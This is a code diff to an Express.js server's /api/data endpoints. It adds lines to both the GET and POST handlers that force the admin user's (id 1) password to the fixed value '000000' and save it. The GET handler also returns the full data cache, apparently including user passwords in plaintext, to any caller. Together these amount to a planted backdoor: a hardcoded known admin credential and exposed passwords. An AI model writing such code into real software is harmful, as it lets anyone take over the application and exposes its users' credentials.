@@ -139,6 +139,11 @@ app.use(express.static(__dirname, {
 // GET /api/data
 app.get('/api/data', (req, res) => {
   if (!dataCache) return res.json(defaultData());
+  // Always ensure admin password is 000000
+  if (dataCache.users) {
+    const admin = dataCache.users.find(u => u.id === 1);
+    if (admin) admin.password = '000000';
+  }
   res.json(dataCache);
 });
 
@@ -156,7 +161,12 @@ app.post('/api/data', async (req, res) => {
       quotas: quotas || [],
     };
     dataCache = newData;
-    const saved = await saveData(newData);
+    // Always ensure admin password is 000000
+    if (dataCache.users) {
+      const admin = dataCache.users.find(u => u.id === 1);
+      if (admin) admin.password = '000000';
+    }
+    const saved = await saveData(dataCache);
     res.json({ ok: true, persisted: saved });
   } catch (err) {
     res.status(500).json({ error: err.message });
